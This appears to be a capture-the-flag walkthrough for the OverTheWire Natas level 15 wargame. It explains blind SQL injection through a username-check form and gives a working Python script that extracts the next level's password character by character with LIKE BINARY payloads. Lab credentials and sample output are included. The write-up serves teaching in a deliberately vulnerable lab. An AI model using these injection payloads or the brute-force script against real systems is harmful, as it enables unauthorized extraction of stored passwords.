# 🔐 Natas15 Walkthrough

In this level, we only have a `username` form, that's used to check the existence of a username in the database. Naturally we want to check if a the database contains the **natas16** information. Putting natas16 into the form we get: 

```
This user exists.
```

✅ This confirms that the form has access to the `natas16` login data. If the username exists, there's definitely a **password** stored nearby — we just need to extract it. 

## 📄 View the Source Code

As with previous levels, let’s check the [View sourcecode](http://natas15.natas.labs.overthewire.org/index-source.html) 

We see:

```php
if(array_key_exists("debug", $_GET)) {
    echo "Executing query: $query<br>";
}
```

✅ So there's a **debug mode** that will echo the executed SQL query. We can trigger it by adding `&debug` to the URL.

Try this:

```
http://natas15.natas.labs.overthewire.org/?username=&debug
```

This shows us the contents of the `username` variable, as before this will be helpfull in manipulating our `""` injection.

## 🧪 Trying basic SQL injection

Let’s test a basic injection like in Natas14:

```
INPUT:
http://natas15.natas.labs.overthewire.org?username=password" OR "1&debug

OUTPUT:
Executing query: SELECT * from users where username="password" OR "1"
This user exists.
```
**It works** — but this query just checks if any matching row exists. There’s no password input or output here. So instead of bypassing authentication, we now have to figure out the password for natas16 **one character at a time** this is called ***blind SQL injection.***


## 🎯 Blind SQL injection with `LIKE BINARY`

#### What is LIKE BINARY?
`LIKE BINARY` is a SQL operator used to perform **case-sensitive pattern matching**. It works like the standard `LIKE`, but with `BINARY`, comparisons **respect the exact letter casing** (uppercase ≠ lowercase).

- ✅ Use when you want to match patterns exactly, including letter case.  
- ❌ Without `BINARY`, `LIKE` treats uppercase and lowercase letters as the same (in most databases like MySQL).
```
Without `BINARY` (case-insensitive):
SELECT * FROM users WHERE password LIKE 'pass%';

✅ Matches: `password`, `Pass123`, `PASS`

-------------------------------------------------------

With `BINARY` (case-sensitive):
SELECT * FROM users WHERE password LIKE BINARY 'pass%';

✅ Matches: `password`  
❌ Doesn’t match: `Password`, `PASS`
```

This is exactly what we need to extract `natas16`’s password reliably.

## 🔬 LIKE BINARY Test example

To check if the password contains a character (e.g., `c`), we can try:

>[!IMPORTANT]
>Remember that url characters have their own encoding!



```
form:
username = natas16" and password LIKE BINARY "%c%

ulr:
http://natas15.natas.labs.overthewire.org/?username=natas16%22%20and%20password%20LIKE%20BINARY%20%22%c%&debug
```
This checks whether the password contains the letter `c`.  
If it does, the site returns:

***This user exists.***

## 🤖 Automating this process
So obviously we could just manually put all of the english alphabet both in lowercase and uppercase + digits, this would be, as you can probably tell, very repetetive and would take a long time. So, being the hackers that we are, let's automate the process.

>[!NOTE]
>A more polished, visually appealing version of this script is also available in the directory. That version includes styled console output and progress indicators but may run slightly slower due to the added formatting. Use whichever you prefer — this version is optimized for speed.

#### Step 1: Discover valid characters
```python
# Natas15 bruteforce script :)

import requests, string

url = "http://natas15.natas.labs.overthewire.org"
username = "natas15"
password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"

# Get the entire English alphabet (uppercase and lowercase) plus digits.
char_data = string.ascii_letters + string.digits
password_char_data = []

# ========= Step 1: Build a character dictionary =========
print("[*] Building character set...")
for char in char_data:
    injection = f'natas16" AND password LIKE BINARY "%{char}%" -- '
    response = requests.get(url, auth=(username, password), params={'username': injection})
    if "This user exists." in response.text:
        password_char_data.append(char)
        print(f"[+] Found valid character: {char}")

print("\n[✔] Character dictionary complete:")
print("".join(password_char_data))
```

This portion of the script establishes a list `password_char_data` of all the alphanumeric characters that result in `This user exists.` After establishing this list we can deduct the whole password in the same way, but **sorted correctly**, the script continues:


#### Step 2: Brute force the password

```python
# ========= Step 2: Brute-force the password =========
print("\n[*] Starting brute-force...")
natas16_password = ""

# Natas passwords are no longer then 32 characters, via the previous passwords.
while len(natas16_password) < 32:  
    for char in password_char_data:
        attempt = natas16_password + char
        injection = f'natas16" AND password LIKE BINARY "{attempt}%" -- '
        response = requests.get(url, auth=(username, password), params={'username': injection})

        if "This user exists." in response.text:
            natas16_password += char
            print(f"[+] Password so far: {natas16_password}")


print("\n[✔] Your password for natas16:")
print(natas16_password)
```

The output should take you through all the steps it did and it looks something like this:

```
[*] Building character set...
[+] Found valid character: c
[+] Found valid character: e
[+] Found valid character: f
(...)
[+] Found valid character: Y
[+] Found valid character: 3
[+] Found valid character: 4
[+] Found valid character: 6

[✔] Character dictionary complete:
cefhijkmostuvDEGKLMPQVWXY346

[*] Starting brute-force...
[+] Password so far: h
[+] Password so far: hP
[+] Password so far: hPk
(...)
[+] Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4s
[+] Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sG
[+] Password so far: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo

[✔] Your password for natas16:
hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```

And that's it, your natas16 password is right there! `(:`.